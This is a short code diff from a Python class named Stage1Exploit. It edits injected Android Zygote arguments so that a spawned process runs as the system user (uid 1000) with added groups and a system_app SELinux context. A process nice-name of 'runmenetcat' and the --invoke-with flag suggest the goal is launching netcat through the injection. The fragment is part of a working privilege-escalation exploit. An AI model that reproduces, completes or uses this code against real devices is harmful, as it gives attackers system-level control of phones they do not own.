@@ -189,9 +189,9 @@ class Stage1Exploit:
         raw_zygote_arguments = [
             "--setuid=1000",
             "--setgid=1000",
-            "--setgroups=3003",
+            "--setgroups=1000,1065,3003,3009",
             "--runtime-args",
-            "--seinfo=platform:isSystemServer:priv_app:targetSdkVersion=28:complete",
+            "--seinfo=platform:isSystemServer:system_app:targetSdkVersion=28:complete",
             "--runtime-flags=1",
             "--nice-name=runmenetcat",
             "--invoke-with",
